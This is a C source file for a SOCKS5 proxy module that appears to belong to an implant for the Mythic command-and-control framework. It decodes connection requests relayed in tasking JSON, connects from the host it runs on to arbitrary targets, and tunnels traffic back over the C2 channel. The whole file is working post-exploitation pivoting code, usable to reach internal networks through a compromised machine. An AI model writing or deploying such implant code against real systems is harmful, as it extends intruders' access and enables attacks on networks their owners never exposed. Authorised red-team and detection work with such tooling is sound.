#include "socks5.h"
#include "b64.h"
#include "cJSON.h"
#include "utils.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#define MAX_SOCKS_CONNS  64
#define SOCKS5_BUF_SIZE  65536
#define CONNECT_TIMEOUT  10   /* seconds */

/* SOCKS5 reply codes */
#define SOCKS5_REP_SUCCESS      0x00
#define SOCKS5_REP_ECONNREFUSED 0x05
#define SOCKS5_REP_CMDNOTSUP    0x07
#define SOCKS5_REP_ATYPNOTSUP   0x08
#define SOCKS5_REP_GENERAL      0x01

typedef struct {
    int  server_id;
    int  sock_fd;
    bool in_use;
} SocksConn;

static SocksConn       g_conns[MAX_SOCKS_CONNS];
static pthread_mutex_t g_socks_lock = PTHREAD_MUTEX_INITIALIZER;

/* Pending outbound items: connect replies and data read from sockets.
   Produced by socksProcessInbound and socksPollOutbound (under lock).
   Consumed and cleared by socksPollOutbound. */
typedef struct SocksOutItem {
    int                  server_id;
    unsigned char       *data;
    size_t               data_len;
    bool                 exit_flag;
    struct SocksOutItem *next;
} SocksOutItem;

static SocksOutItem *g_out_head = NULL;
static SocksOutItem *g_out_tail = NULL;

/* -------------------------------------------------------------------------
 * Internal helpers — all called with g_socks_lock held
 * ---------------------------------------------------------------------- */

static void enqueueOutLocked(int server_id, const unsigned char *data,
                              size_t len, bool exit_flag)
{
    SocksOutItem *item = calloc(1, sizeof(SocksOutItem));
    if (!item)
        return;
    item->server_id = server_id;
    item->exit_flag = exit_flag;
    if (data && len > 0) {
        item->data = malloc(len);
        if (!item->data) { free(item); return; }
        memcpy(item->data, data, len);
        item->data_len = len;
    }
    if (g_out_tail)
        g_out_tail->next = item;
    else
        g_out_head = item;
    g_out_tail = item;
}

static SocksConn *findConnLocked(int server_id)
{
    for (int i = 0; i < MAX_SOCKS_CONNS; i++)
        if (g_conns[i].in_use && g_conns[i].server_id == server_id)
            return &g_conns[i];
    return NULL;
}

static SocksConn *allocConnLocked(void)
{
    for (int i = 0; i < MAX_SOCKS_CONNS; i++)
        if (!g_conns[i].in_use)
            return &g_conns[i];
    return NULL;
}

static void closeConnLocked(SocksConn *c)
{
    if (!c->in_use)
        return;
    close(c->sock_fd);
    c->sock_fd = -1;
    c->in_use  = false;
}

/* -------------------------------------------------------------------------
 * Unlocked I/O helpers — called WITHOUT g_socks_lock
 * ---------------------------------------------------------------------- */

/* Connect to host:port with a non-blocking connect + select timeout.
   Returns a connected socket fd on success, -1 on failure. */
static int connectTarget(const char *host, uint16_t port)
{
    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", port);

    struct addrinfo hints = {0};
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo *res = NULL;
    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res)
        return -1;

    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) { freeaddrinfo(res); return -1; }

    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    int ret = connect(fd, res->ai_addr, res->ai_addrlen);
    freeaddrinfo(res);

    if (ret == 0) {
        fcntl(fd, F_SETFL, flags);
        return fd;
    }
    if (errno != EINPROGRESS) {
        close(fd);
        return -1;
    }

    fd_set wset;
    FD_ZERO(&wset);
    FD_SET(fd, &wset);
    struct timeval tv = { CONNECT_TIMEOUT, 0 };
    ret = select(fd + 1, NULL, &wset, NULL, &tv);
    if (ret <= 0) {
        close(fd);
        return -1;
    }

    int err = 0;
    socklen_t slen = sizeof(err);
    getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &slen);
    if (err != 0) {
        close(fd);
        return -1;
    }

    fcntl(fd, F_SETFL, flags);
    return fd;
}

/* Parse a SOCKS5 CONNECT request and connect to the target.
   Returns SOCKS5 reply code (0x00 = success) and sets *out_fd. */
static uint8_t handleConnect(int server_id, const unsigned char *req,
                              size_t len, int *out_fd)
{
    (void)server_id; /* used only in DBGPRINT */
    *out_fd = -1;
    if (len < 7)
        return SOCKS5_REP_GENERAL;
    if (req[0] != 0x05 || req[1] != 0x01)
        return SOCKS5_REP_CMDNOTSUP;

    uint8_t  atyp = req[3];
    char     host[256] = {0};
    uint16_t port = 0;

    if (atyp == 0x01) {
        if (len < 10)
            return SOCKS5_REP_GENERAL;
        snprintf(host, sizeof(host), "%u.%u.%u.%u",
                 req[4], req[5], req[6], req[7]);
        port = (uint16_t)((req[8] << 8) | req[9]);
    } else if (atyp == 0x03) {
        uint8_t nlen = req[4];
        if (len < (size_t)(5 + nlen + 2))
            return SOCKS5_REP_GENERAL;
        memcpy(host, &req[5], nlen);
        port = (uint16_t)((req[5 + nlen] << 8) | req[6 + nlen]);
    } else if (atyp == 0x04) {
        if (len < 22)
            return SOCKS5_REP_GENERAL;
        inet_ntop(AF_INET6, &req[4], host, sizeof(host));
        port = (uint16_t)((req[20] << 8) | req[21]);
    } else {
        return SOCKS5_REP_ATYPNOTSUP;
    }

    DBGPRINT("socks5: CONNECT %s:%u (server_id=%d)", host, port, server_id);
    int fd = connectTarget(host, port);
    if (fd < 0)
        return SOCKS5_REP_ECONNREFUSED;

    *out_fd = fd;
    return SOCKS5_REP_SUCCESS;
}

/* -------------------------------------------------------------------------
 * Public API
 * ---------------------------------------------------------------------- */

void socksInit(void)
{
    pthread_mutex_lock(&g_socks_lock);
    memset(g_conns, 0, sizeof(g_conns));
    for (int i = 0; i < MAX_SOCKS_CONNS; i++)
        g_conns[i].sock_fd = -1;
    pthread_mutex_unlock(&g_socks_lock);
}

void socksTeardown(void)
{
    socksFlush();
}

void socksFlush(void)
{
    pthread_mutex_lock(&g_socks_lock);
    for (int i = 0; i < MAX_SOCKS_CONNS; i++) {
        if (g_conns[i].in_use)
            closeConnLocked(&g_conns[i]);
    }
    SocksOutItem *item = g_out_head;
    while (item) {
        SocksOutItem *next = item->next;
        free(item->data);
        free(item);
        item = next;
    }
    g_out_head = g_out_tail = NULL;
    pthread_mutex_unlock(&g_socks_lock);
}

/* Called from a thread-pool worker.  Lock is dropped during slow I/O
   (DNS resolution, connect, send) so socksPollOutbound in the main
   thread is not blocked for extended periods. */
void socksProcessInbound(cJSON *socks_array)
{
    int n = cJSON_GetArraySize(socks_array);

    for (int i = 0; i < n; i++) {
        cJSON *item = cJSON_GetArrayItem(socks_array, i);
        if (!item)
            continue;

        cJSON *sid_item  = cJSON_GetObjectItem(item, "server_id");
        cJSON *data_item = cJSON_GetObjectItem(item, "data");
        cJSON *exit_item = cJSON_GetObjectItem(item, "exit");

        if (!cJSON_IsNumber(sid_item))
            continue;

        int  server_id = (int)sid_item->valuedouble;
        bool is_exit   = cJSON_IsTrue(exit_item);

        unsigned char *raw     = NULL;
        size_t         raw_len = 0;
        if (cJSON_IsString(data_item) && data_item->valuestring &&
            data_item->valuestring[0] != '\0') {
            raw = base64_decode(data_item->valuestring,
                                strlen(data_item->valuestring), &raw_len);
        }

        /* --- Handle exit -------------------------------------------- */
        if (is_exit) {
            pthread_mutex_lock(&g_socks_lock);
            SocksConn *conn = findConnLocked(server_id);
            if (conn)
                closeConnLocked(conn);
            enqueueOutLocked(server_id, NULL, 0, true);
            pthread_mutex_unlock(&g_socks_lock);
            free(raw);
            continue;
        }

        /* --- Look up connection without holding lock during I/O ------ */
        pthread_mutex_lock(&g_socks_lock);
        SocksConn *conn = findConnLocked(server_id);

        if (!conn) {
            /* New connection — perform DNS + TCP connect outside lock */
            pthread_mutex_unlock(&g_socks_lock);

            if (!raw || raw_len < 7) {
                free(raw);
                continue;
            }

            int     fd   = -1;
            uint8_t code = handleConnect(server_id, raw, raw_len, &fd);
            free(raw);

            unsigned char reply[10] = { 0x05, code, 0x00, 0x01,
                                        0x00, 0x00, 0x00, 0x00,
                                        0x00, 0x00 };

            pthread_mutex_lock(&g_socks_lock);
            enqueueOutLocked(server_id, reply, sizeof(reply), false);
            if (code == SOCKS5_REP_SUCCESS) {
                SocksConn *slot = allocConnLocked();
                if (slot) {
                    slot->server_id = server_id;
                    slot->sock_fd   = fd;
                    slot->in_use    = true;
                } else {
                    close(fd);
                    /* Overwrite reply with a "general failure" so Mythic knows */
                    reply[1] = SOCKS5_REP_GENERAL;
                    enqueueOutLocked(server_id, reply, sizeof(reply), false);
                }
            }
            pthread_mutex_unlock(&g_socks_lock);
        } else {
            /* Existing connection — forward data outside lock */
            int fd = conn->sock_fd;
            pthread_mutex_unlock(&g_socks_lock);

            if (raw && raw_len > 0) {
                ssize_t sent = send(fd, raw, raw_len, 0);
                if (sent < 0) {
                    DBGPRINT("socks5: send error (server_id=%d): %s",
                             server_id, strerror(errno));
                    pthread_mutex_lock(&g_socks_lock);
                    SocksConn *c = findConnLocked(server_id);
                    if (c)
                        closeConnLocked(c);
                    enqueueOutLocked(server_id, NULL, 0, true);
                    pthread_mutex_unlock(&g_socks_lock);
                }
            }
            free(raw);
        }
    }
}

/* Called from the main taskingLoop.  Drains the pending-reply queue and
   polls all open sockets (non-blocking select).  Returns a cJSON array
   to embed in the next get_tasking request, or NULL if nothing to send. */
cJSON *socksPollOutbound(void)
{
    pthread_mutex_lock(&g_socks_lock);

    cJSON *arr = NULL;

    /* Drain pending reply queue */
    SocksOutItem *item = g_out_head;
    while (item) {
        if (!arr)
            arr = cJSON_CreateArray();
        cJSON *entry = cJSON_CreateObject();
        cJSON_AddNumberToObject(entry, "server_id", item->server_id);
        if (item->data && item->data_len > 0) {
            size_t enc_len = 0;
            char  *enc     = base64_encode(item->data, item->data_len, &enc_len);
            if (enc) {
                cJSON_AddStringToObject(entry, "data", enc);
                free(enc);
            } else {
                cJSON_AddStringToObject(entry, "data", "");
            }
        } else {
            cJSON_AddStringToObject(entry, "data", "");
        }
        cJSON_AddBoolToObject(entry, "exit", item->exit_flag);
        cJSON_AddItemToArray(arr, entry);

        SocksOutItem *next = item->next;
        free(item->data);
        free(item);
        item = next;
    }
    g_out_head = g_out_tail = NULL;

    /* Non-blocking poll of all open sockets */
    fd_set rset, eset;
    FD_ZERO(&rset);
    FD_ZERO(&eset);
    int maxfd = -1;

    for (int i = 0; i < MAX_SOCKS_CONNS; i++) {
        if (!g_conns[i].in_use)
            continue;
        FD_SET(g_conns[i].sock_fd, &rset);
        FD_SET(g_conns[i].sock_fd, &eset);
        if (g_conns[i].sock_fd > maxfd)
            maxfd = g_conns[i].sock_fd;
    }

    if (maxfd >= 0) {
        struct timeval tv = { 0, 0 };
        int nready = select(maxfd + 1, &rset, NULL, &eset, &tv);
        if (nready > 0) {
            unsigned char *buf = malloc(SOCKS5_BUF_SIZE);
            if (buf) {
                for (int i = 0; i < MAX_SOCKS_CONNS; i++) {
                    if (!g_conns[i].in_use)
                        continue;
                    int fd  = g_conns[i].sock_fd;
                    int sid = g_conns[i].server_id;

                    if (FD_ISSET(fd, &eset)) {
                        closeConnLocked(&g_conns[i]);
                        if (!arr) arr = cJSON_CreateArray();
                        cJSON *entry = cJSON_CreateObject();
                        cJSON_AddNumberToObject(entry, "server_id", sid);
                        cJSON_AddStringToObject(entry, "data", "");
                        cJSON_AddBoolToObject(entry, "exit", true);
                        cJSON_AddItemToArray(arr, entry);
                        continue;
                    }
                    if (!FD_ISSET(fd, &rset))
                        continue;

                    ssize_t n = recv(fd, buf, SOCKS5_BUF_SIZE, 0);
                    if (n <= 0) {
                        closeConnLocked(&g_conns[i]);
                        if (!arr) arr = cJSON_CreateArray();
                        cJSON *entry = cJSON_CreateObject();
                        cJSON_AddNumberToObject(entry, "server_id", sid);
                        cJSON_AddStringToObject(entry, "data", "");
                        cJSON_AddBoolToObject(entry, "exit", true);
                        cJSON_AddItemToArray(arr, entry);
                    } else {
                        size_t enc_len = 0;
                        char  *enc     = base64_encode(buf, (size_t)n, &enc_len);
                        if (enc) {
                            if (!arr) arr = cJSON_CreateArray();
                            cJSON *entry = cJSON_CreateObject();
                            cJSON_AddNumberToObject(entry, "server_id", sid);
                            cJSON_AddStringToObject(entry, "data", enc);
                            cJSON_AddBoolToObject(entry, "exit", false);
                            cJSON_AddItemToArray(arr, entry);
                            free(enc);
                        }
                    }
                }
                free(buf);
            }
        }
    }

    pthread_mutex_unlock(&g_socks_lock);
    return arr;
}
